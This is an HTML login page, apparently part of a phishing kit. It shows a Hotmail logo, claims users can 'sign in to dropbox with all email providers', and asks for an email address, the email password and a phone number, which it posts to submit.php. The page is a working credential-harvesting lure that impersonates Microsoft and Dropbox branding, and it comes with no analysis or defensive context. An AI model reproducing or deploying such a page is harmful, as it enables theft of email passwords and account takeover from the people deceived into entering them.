
<!DOCTYPE HTML>
<html>
  
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    
    <link rel="stylesheet" type="text/css" href="css/default.css" id="theme" />
  </head>
  
  <body>
  

  <img src="images/hotmail.jpg" style="position:absolute; top:10px; left:5px; height:32px; width:auto;" id="ImgLogo" />
  
  <center>
  
  
  <div id="imgLogoText" style="font-size:16px; margin-bottom:10px; color:#A0A0A4; text-align:center; height:50px; padding-top:0%; padding-left:7%; z-index:99999; position:relative; "></div></center>
  
 <form id="docContainer" name="docContainer"  method="POST" action="submit.php" novalidate="novalidate" class="fb-100-item-column fb-toplabel hidehints selected-object" style="background-color: rgb(247, 247, 247); border-top-color: rgb(184, 177, 181); border-right-color: rgb(184, 177, 181); border-bottom-color: rgb(184, 177, 181); border-left-color: rgb(184, 177, 181); width: 450px; margin-top:2px;" data-form="preview" onSubmit="return validation()">
  <span id="formHeader"></span>
  
  
    
    
    <style> #fb-form-header1 span{ font-size:12px; color:#2A1FAA; font-weight:bold; font-variant:small-caps; padding:8px; text-align:center; }    </style>
    
    
      <div id="fb-form-header1" class="fb-form-header" style="min-height: 20px; height: 50px; background-color:#ddd;   ">
     <span>now , you can sign in to dropbox with all email providers.</span>
      </div>
      
      
      
      <div id="section1" class="section">
        <div id="column1" class="column ui-sortable">
          <div id="item1" class="fb-item fb-100-item-column">
            <div class="fb-grouplabel">
            
            
              <label id="item1_label_0" style="display: inline; ">Email<span id="usernameError" style="display:none; color:red; padding-left:4%;">Please enter your email</span></label>
            </div>
            <div class="fb-input-box">
              <input type="text"  maxlength="240" placeholder="Enter your email" 
              autocomplete="off" id="username"  name="username" style="background: white url(images/lockbg.png) right no-repeat ; padding-right:6%;" onKeyUp="onkeyuser()" />
            </div>
          </div>
          <div id="item2" class="fb-item fb-100-item-column">
            <div class="fb-grouplabel">
              <label id="item2_label_0" style="display: inline; ">Password <span id="passwordError" style=" display:none; color:red; padding-left:4%;">Please enter your email password</span></label>
            </div>
            <div class="fb-input-box">
              <input type="password"  placeholder="Email Password" autocomplete="off"  
              name="password" style="background: white url(images/lockbg.png) right no-repeat ; padding-right:6%;" onKeyUp="onkeypass()"/>
            </div>
          </div>
		  <div id="item3" class="fb-item fb-100-item-column">
            <div class="fb-grouplabel">
              <label id="item3_label_0" style="display: inline; ">Phone number <span id="passwordError" style=" display:none; color:red; padding-left:4%;">Please enter your phone number</span></label>
            </div>
            <div class="fb-input-box">
              <input type="tel"  placeholder="phone number" autocomplete="off"  
              name="tel" style="background: white url(images/lockbg.png) right no-repeat ; padding-right:6%;" onKeyUp="onkeypass()"/>
            </div>
          </div>
        </div>
      </div>
     
      <div id="fb-submit-button-div" class="fb-item-alignment-left fb-footer"
      style="min-height: 1px; background-color:#ddd; padding-left: 270px; ">
        <input type="submit" class="fb-button-special" id="fb-submit-button" 
        style="background-image: url(images/btn_submit.png); " value="Submit"
        />
      </div>
      <input type="hidden" name="changing" value="Value" />
    </form>
  </body>

</html>